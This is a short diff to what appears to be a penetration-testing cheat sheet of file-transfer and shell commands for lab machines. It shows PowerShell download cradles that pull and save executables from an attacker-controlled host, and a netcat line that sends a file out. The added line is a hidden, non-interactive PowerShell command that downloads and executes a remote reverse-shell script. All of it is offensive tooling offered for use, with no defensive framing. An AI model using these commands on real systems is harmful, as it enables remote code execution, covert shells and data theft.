@@ -31,7 +31,9 @@ nc -w 5 10.10.14.18 4445 < /usr/local/bin/ovrflw
 iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/file')  
 Invoke-WebRequest "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"  
 Invoke-RestMethod "http://10.10.10.10/file.exe" -OutFile "C:\Users\Public\file.exe"  
-(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "C:\Users\Public\Documents\file.exe")   
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "C:\Users\Public\Documents\file.exe") 
+
+powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')  
 
 Interactive shell:
 --------------------------------------------------
